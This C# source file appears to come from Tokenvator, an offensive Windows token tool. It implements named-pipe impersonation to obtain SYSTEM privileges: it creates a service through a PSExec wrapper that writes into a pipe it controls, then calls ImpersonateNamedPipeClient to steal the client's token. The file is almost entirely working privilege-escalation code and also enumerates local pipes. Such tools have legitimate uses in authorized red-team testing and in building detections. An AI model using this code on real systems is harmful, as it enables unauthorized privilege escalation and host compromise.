using System;
using System.IO;
using System.Threading;

using Unmanaged.Headers;
using Unmanaged.Libraries;

namespace Tokenvator
{
    class NamedPipes
    {
        private const String baseDirectory = @"\\.\pipe\";
        
        internal NamedPipes()
        {
            
        }

        internal static void GetSystem()
        {
            using (PSExec psExec = new PSExec("Tokenvator"))
            {
                psExec.Connect(".");
                psExec.Create("%COMSPEC% /c start %COMSPEC% /c echo \"tokenvator\" > \\\\.\\pipe\\Tokenvator; timeout 5");
                psExec.Open();
                Thread thread = new Thread(() => GetPipeToken(@"\\.\pipe\Tokenvator"));
                thread.Start();
                psExec.Start();
                thread.Join();
                psExec.Stop();
            }
        }

        internal static Boolean GetPipeToken(String pipeName)
        {
            //Winbase._SECURITY_ATTRIBUTES lpSecurityAttributes = new Winbase._SECURITY_ATTRIBUTES();
            IntPtr hNamedPipe = kernel32.CreateNamedPipeA(pipeName, Winbase.OPEN_MODE.PIPE_ACCESS_DUPLEX, Winbase.PIPE_MODE.PIPE_TYPE_MESSAGE | Winbase.PIPE_MODE.PIPE_WAIT, 3, 0, 0, 0, IntPtr.Zero);
            if (IntPtr.Zero == hNamedPipe)
            {
                Console.WriteLine("[-] CreateNamedPipeA Failed");
                return false;
            }
            Console.WriteLine("[+] Created Pipe {0}", pipeName);

            if (!kernel32.ConnectNamedPipe(hNamedPipe, IntPtr.Zero))
            {
                Console.WriteLine("[-] ConnectNamedPipe Failed");
            }
            Console.WriteLine("[+] Connected to Pipe {0}", pipeName);

            Byte[] lpBuffer = new Byte[128];
            UInt32 lpNumberOfBytesRead = 0;
            //MinWinBase._OVERLAPPED lpOverlapped2 = new MinWinBase._OVERLAPPED();
            if (!fileapi.ReadFile(hNamedPipe, ref lpBuffer, 1, ref lpNumberOfBytesRead, IntPtr.Zero))
            {
                Console.WriteLine("[-] ReadFile Failed");
                Console.WriteLine(new System.ComponentModel.Win32Exception(System.Runtime.InteropServices.Marshal.GetLastWin32Error()).Message);
            }
            Console.WriteLine("[+] Read Pipe {0}", pipeName);

            if (!advapi32.ImpersonateNamedPipeClient(hNamedPipe))
            {
                Console.WriteLine("[-] ImpersonateNamedPipeClient Failed");
                Console.WriteLine(new System.ComponentModel.Win32Exception(System.Runtime.InteropServices.Marshal.GetLastWin32Error()).Message);
            }
            Console.WriteLine("[+] Impersonated Pipe {0} Client", pipeName);

            

            return true;
        }

        internal static void EnumeratePipes()
        {
            String[] pipes = Directory.GetFiles(baseDirectory);
            foreach (String pipe in pipes)
            {
                Console.WriteLine(pipe);
            }
        }
    }
}
